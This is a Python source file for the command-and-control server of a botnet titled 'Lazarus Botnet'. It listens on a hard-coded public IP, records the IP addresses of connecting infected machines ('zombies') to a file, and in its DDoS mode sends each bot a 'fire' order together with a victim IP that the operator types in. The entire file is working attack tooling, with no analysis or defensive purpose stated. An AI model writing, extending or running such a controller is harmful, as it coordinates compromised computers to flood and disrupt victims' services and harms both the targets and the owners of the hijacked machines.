import socket               # Import socket module
import os
import shutil
import random
import string


s = socket.socket()         # Create a socket object
host = '139.144.151.232'
port = 1337                  # Reserve a port for your service.
s.bind((host, port))        # Bind to the port
s.listen()                 # Now wait for client connection.

def main():
    print("""Welcome to Lazarus Botnet
    \n1) Connect bots to server\n2) DDoS\n3) Exit""")

    x = input("\n\n>>>: ")
    if x == '1':
        print("Waiting for zombies $...")
        connectBots()
    if x == '2':
        ddos()
    if x == '3':
        quit()

def connectBots():
    while True:
        c, addr = s.accept()     # Establish connection with client.
        print("Got IP!")
        ip = c.recv(1024)
        ip = ip.decode()
        with open('ip.txt', 'a') as ip_recv:
            ip_recv.write(ip + '\n')
        ip_recv.close()
        c.close()                # Close the connection
        
def ddos():
    victim_ip = input("Enter victims IP: ")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = '139.144.151.232'
        port = 443
        try:
            s.bind((host, port))
            s.listen(1)
            c, addr = s.accept()
            try:
                c.send(bytes("fire", "utf-8"))
                c.send(bytes(victim_ip, "utf-8"))
                print(f'[+] Zombie: {addr[0]} is now firing!')
            finally:
                c.close()
        finally:
            s.close()

            
main()